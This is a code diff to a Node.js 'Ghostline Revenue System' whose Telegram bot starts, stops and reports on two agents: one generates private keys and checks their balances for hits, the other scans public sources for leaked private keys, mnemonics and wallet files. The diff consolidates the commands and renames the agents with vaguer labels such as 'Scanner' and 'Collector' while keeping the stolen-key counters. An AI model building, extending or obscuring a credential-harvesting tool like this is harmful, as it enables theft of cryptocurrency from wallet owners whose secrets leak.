@@ -448,97 +448,41 @@ class GhostlineRevenueSystem {
     initializeTelegramBot() {
         this.bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
         
-        // Hunter commands
-        this.bot.onText(/\/start_hunter/, async (msg) => {
-            const chatId = msg.chat.id;
-            try {
-                const result = await this.hunter.start();
-                this.bot.sendMessage(chatId, result.message);
-            } catch (error) {
-                this.bot.sendMessage(chatId, `Error starting Hunter: ${error.message}`);
-            }
-        });
-
-        this.bot.onText(/\/stop_hunter/, async (msg) => {
-            const chatId = msg.chat.id;
-            try {
-                const result = await this.hunter.stop();
-                this.bot.sendMessage(chatId, result.message);
-            } catch (error) {
-                this.bot.sendMessage(chatId, `Error stopping Hunter: ${error.message}`);
-            }
-        });
-
-        this.bot.onText(/\/hunter_status/, async (msg) => {
-            const chatId = msg.chat.id;
-            const status = this.getHunterStatus();
-            this.bot.sendMessage(chatId, status);
-        });
-
-        // Scavenger commands
-        this.bot.onText(/\/start_scavenger/, async (msg) => {
-            const chatId = msg.chat.id;
-            try {
-                const result = await this.scavenger.start();
-                this.bot.sendMessage(chatId, result.message);
-            } catch (error) {
-                this.bot.sendMessage(chatId, `Error starting Scavenger: ${error.message}`);
-            }
-        });
-
-        this.bot.onText(/\/stop_scavenger/, async (msg) => {
-            const chatId = msg.chat.id;
-            try {
-                const result = await this.scavenger.stop();
-                this.bot.sendMessage(chatId, result.message);
-            } catch (error) {
-                this.bot.sendMessage(chatId, `Error stopping Scavenger: ${error.message}`);
-            }
-        });
-
-        this.bot.onText(/\/scavenger_status/, async (msg) => {
-            const chatId = msg.chat.id;
-            const status = this.getScavengerStatus();
-            this.bot.sendMessage(chatId, status);
-        });
-
-        // System commands
-        this.bot.onText(/\/status/, async (msg) => {
-            const chatId = msg.chat.id;
-            const status = this.getSystemStatus();
-            this.bot.sendMessage(chatId, status);
-        });
-
-        this.bot.onText(/\/start_all/, async (msg) => {
+        // Primary system control commands
+        this.bot.onText(/\/start/, async (msg) => {
             const chatId = msg.chat.id;
             try {
                 const hunterResult = await this.hunter.start();
                 const scavengerResult = await this.scavenger.start();
                 
-                const message = `Hunter: ${hunterResult.message}\nScavenger: ${scavengerResult.message}`;
-                this.bot.sendMessage(chatId, message);
+                this.bot.sendMessage(chatId, '🚀 Revenue system activated\n\nAll scanning agents operational');
             } catch (error) {
-                this.bot.sendMessage(chatId, `Error starting agents: ${error.message}`);
+                this.bot.sendMessage(chatId, `System startup error: ${error.message}`);
             }
         });
 
-        this.bot.onText(/\/stop_all/, async (msg) => {
+        this.bot.onText(/\/stop/, async (msg) => {
             const chatId = msg.chat.id;
             try {
-                const hunterResult = await this.hunter.stop();
-                const scavengerResult = await this.scavenger.stop();
+                await this.hunter.stop();
+                await this.scavenger.stop();
                 
-                const message = `Hunter: ${hunterResult.message}\nScavenger: ${scavengerResult.message}`;
-                this.bot.sendMessage(chatId, message);
+                this.bot.sendMessage(chatId, '⏹️ Revenue system deactivated\n\nAll scanning operations halted');
             } catch (error) {
-                this.bot.sendMessage(chatId, `Error stopping agents: ${error.message}`);
+                this.bot.sendMessage(chatId, `System shutdown error: ${error.message}`);
             }
         });
 
-        this.bot.onText(/\/help/, async (msg) => {
+        this.bot.onText(/\/status/, async (msg) => {
             const chatId = msg.chat.id;
-            const helpText = this.generateHelpText();
-            this.bot.sendMessage(chatId, helpText);
+            const status = this.getOperationalStatus();
+            this.bot.sendMessage(chatId, status);
+        });
+
+        this.bot.onText(/\/metrics/, async (msg) => {
+            const chatId = msg.chat.id;
+            const metrics = this.getPerformanceMetrics();
+            this.bot.sendMessage(chatId, metrics);
         });
 
         // Error handling
@@ -550,85 +494,65 @@ class GhostlineRevenueSystem {
             this.log(`Telegram polling error: ${error.message}`);
         });
         
-        this.log('Telegram bot initialized successfully');
+        this.log('Telegram bot initialized with streamlined interface');
     }
 
-    getHunterStatus() {
-        const status = this.hunter.getStatus();
-        const metrics = this.hunter.getMetrics();
-        
-        if (!status.isRunning) {
-            return '🔴 Hunter Status: INACTIVE\n\nUse /start_hunter to activate scanning operations.';
-        }
-
-        return `🟢 Hunter Status: ACTIVE\n\n` +
-               `🔑 Keys Generated: ${metrics.keysGenerated}\n` +
-               `💰 Balances Checked: ${metrics.balancesChecked}\n` +
-               `🎯 Positive Hits: ${metrics.positiveHits}\n` +
-               `❌ Errors: ${metrics.errors}\n` +
-               `📊 Success Rate: ${metrics.successRate}\n` +
-               `📈 Error Rate: ${metrics.errorRate}\n` +
-               `⏱️ Runtime: ${status.runtime}\n` +
-               `🔄 Scan Cycles: ${metrics.scanCycles}\n\n` +
-               `Use /stop_hunter to deactivate scanning.`;
-    }
-
-    getScavengerStatus() {
-        const status = this.scavenger.getStatus();
-        
-        if (!status.isRunning) {
-            return '🔴 Scavenger Status: INACTIVE\n\nUse /start_scavenger to activate scanning operations.';
-        }
-
-        return `🟢 Scavenger Status: ACTIVE\n\n` +
-               `📊 Sources Scanned: ${status.counters.sourcesScanned}\n` +
-               `🎯 Matches Found: ${status.counters.matchesFound}\n` +
-               `🔑 Private Keys: ${status.counters.privateKeysFound}\n` +
-               `📝 Mnemonics: ${status.counters.mnemonicsFound}\n` +
-               `📄 Wallet JSON: ${status.counters.walletJsonFound}\n` +
-               `⏱️ Runtime: ${status.runtime}\n` +
-               `📈 Scan Cycles: ${status.counters.scanCycles}\n\n` +
-               `Use /stop_scavenger to deactivate scanning.`;
-    }
-
-    getSystemStatus() {
+    getOperationalStatus() {
         const hunterStatus = this.hunter.getStatus();
         const scavengerStatus = this.scavenger.getStatus();
         
-        let status = '🤖 Ghostline Revenue System Status\n\n';
+        let status = '💰 Revenue System Status\n\n';
         
-        status += `🎯 Hunter: ${hunterStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
-        status += `🔍 Scavenger: ${scavengerStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n\n`;
-        
-        if (hunterStatus.isRunning || scavengerStatus.isRunning) {
-            status += 'Use /hunter_status or /scavenger_status for detailed metrics.\n';
+        if (hunterStatus.isRunning && scavengerStatus.isRunning) {
+            status += '🟢 FULLY OPERATIONAL\n\n';
+        } else if (hunterStatus.isRunning || scavengerStatus.isRunning) {
+            status += '🟡 PARTIAL OPERATION\n\n';
         } else {
-            status += 'Use /start_all to activate both agents.\n';
+            status += '🔴 INACTIVE\n\n';
         }
         
-        status += '\nType /help for available commands.';
+        status += `Scanner: ${hunterStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
+        status += `Collector: ${scavengerStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n\n`;
+        
+        if (!hunterStatus.isRunning && !scavengerStatus.isRunning) {
+            status += 'Use /start to begin revenue operations';
+        } else {
+            status += 'Use /metrics for performance data';
+        }
         
         return status;
     }
 
-    generateHelpText() {
-        return `🤖 Ghostline Revenue System - Commands\n\n` +
-               `🎯 Hunter Commands:\n` +
-               `/start_hunter - Activate private key scanning\n` +
-               `/stop_hunter - Deactivate Hunter\n` +
-               `/hunter_status - Show Hunter metrics\n\n` +
-               `🔍 Scavenger Commands:\n` +
-               `/start_scavenger - Activate public source scanning\n` +
-               `/stop_scavenger - Deactivate Scavenger\n` +
-               `/scavenger_status - Show Scavenger metrics\n\n` +
-               `⚡ System Commands:\n` +
-               `/start_all - Activate both agents\n` +
-               `/stop_all - Deactivate both agents\n` +
-               `/status - Show system overview\n` +
-               `/help - Show this help message\n\n` +
-               `💡 Quick Start:\n` +
-               `• /start_all - Begin revenue operations\n` +
-               `• /status - Monitor system status`;
+    getPerformanceMetrics() {
+        const hunterStatus = this.hunter.getStatus();
+        const hunterMetrics = this.hunter.getMetrics();
+        const scavengerStatus = this.scavenger.getStatus();
+        
+        let metrics = '📊 Performance Metrics\n\n';
+        
+        if (hunterStatus.isRunning) {
+            metrics += `🎯 Scanner Performance\n`;
+            metrics += `• Runtime: ${hunterStatus.runtime}\n`;
+            metrics += `• Keys Generated: ${hunterMetrics.keysGenerated}\n`;
+            metrics += `• Balances Checked: ${hunterMetrics.balancesChecked}\n`;
+            metrics += `• Positive Hits: ${hunterMetrics.positiveHits}\n`;
+            metrics += `• Success Rate: ${hunterMetrics.successRate}\n\n`;
+        }
+        
+        if (scavengerStatus.isRunning) {
+            metrics += `🔍 Collector Performance\n`;
+            metrics += `• Runtime: ${scavengerStatus.runtime}\n`;
+            metrics += `• Sources Scanned: ${scavengerStatus.counters.sourcesScanned}\n`;
+            metrics += `• Matches Found: ${scavengerStatus.counters.matchesFound}\n`;
+            metrics += `• Private Keys: ${scavengerStatus.counters.privateKeysFound}\n`;
+            metrics += `• Mnemonics Found: ${scavengerStatus.counters.mnemonicsFound}\n\n`;
+        }
+        
+        if (!hunterStatus.isRunning && !scavengerStatus.isRunning) {
+            metrics += 'No active operations to report\n\nUse /start to begin scanning';
+        }
+        
+        return metrics;
     }
 
     async start() {
@@ -700,4 +624,4 @@ process.on('SIGTERM', async () => {
     }
 });
 
-module.exports = GhostlineRevenueSystem;
+module.exports = GhostlineRevenueSystem;  
